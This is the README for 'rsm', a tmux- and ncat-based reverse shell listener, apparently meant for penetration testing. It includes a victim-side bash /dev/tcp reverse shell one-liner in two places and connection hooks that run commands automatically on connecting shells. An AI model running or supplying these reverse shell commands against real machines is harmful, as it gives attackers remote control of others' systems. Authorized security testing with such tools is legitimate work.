# Notice

**I will not maintain this repo from now on.** I have developed a new alternative with significant improvements over this project. Please refer to [this new `rsm` script](https://github.com/djosix/RaaS/blob/main/rsm.py).

## Introduction

A simple reverse shell manager using `tmux` and `ncat`.

## Install

```shell
BIN_PATH=/usr/local/bin/rsm
curl -o "$BIN_PATH" https://raw.githubusercontent.com/djosix/rsm/master/rsm
chmod +x "$BIN_PATH"
```

If the bash script is not working you can try Python version (translated by gpt-o1-preview)

```shell
BIN_PATH=/usr/local/bin/rsm
curl -o "$BIN_PATH" https://raw.githubusercontent.com/djosix/rsm/master/rsm.py
chmod +x "$BIN_PATH"
```

## Quick Start

1. Listen on a port and attach to rsm tmux session:
    ```shell
    rsm 14641
    ```
    > `rsm` creates it's own tmux socket, so it will not mess up with your default tmux sessions.

2. On victim's machine, launch a reverse shell:
    ```shell
    bash -c 'bash -i >& /dev/tcp/127.0.0.1/14641 0<&1'
    ```
3. Once it connects back to the `rsm` port, `rsm` will create a new tmux window to handle the TCP connection. You can simply switch to that window and start typing commands.

## Usage

`$ rsm --help`

```
Usage: COMMAND [OPTIONS]
Commands:
    rsm PORT            Start a reverse shell listener on PORT
    rsm d[etached] PORT Start a detached reverse shell listener on PORT
    rsm l[ist]          List active rsm listeners
    rsm i[nfo] PORT     Show details of listener on PORT
    rsm i[nfo]          Show details of all rsm listeners
    rsm s[top] PORT     Stop a rsm listener on PORT
    rsm s[top]          Stop all rsm listeners
    rsm a[ttach] PORT   Attach to a rsm session listening on PORT
    rsm a[ttach]        Attach to the last rsm session
    rsm c[lean] PORT    Clean sockets for PORT
    rsm c[lean]         Clean all sockets
    rsm h[elp]          Show this help message
Options:
    -d, --dir DIR       Where the rsm sockets be stored (default: /tmp/.rsm)
    -n, --max-conn N    Maximum number of connections (default: 128)
    -r, --max-recv N    Maximum receiving MB (default: 64)
    -c, --hook CMD      Command to eval when a client connects
    -w, --with CMD      Command to eval when rsm starts
    --ncat-flags FLAGS  Additional command line flags for ncat
    --tmux-flags FLAGS  Additional command line flags for tmux
    -h, --help          Show this help message
```

## Connection Hooks

You are able to run custom command to handle a client connection:

```shell
rsm detached 12345 --hook 'echo "Hello, you are from ${IP}:${PORT}!"; exit'

ncat 127.0.0.1 12345
# Hello, you are from 127.0.0.1:50920!
```

With this feature, you can run commands automatically when a reverse shell connects back:

```shell
rsm detached 12345 --hook "echo 'echo SomeContent > \$HOME/SomeFile; exit'; exit"

bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
cat ~/SomeFile # SomeContent
```
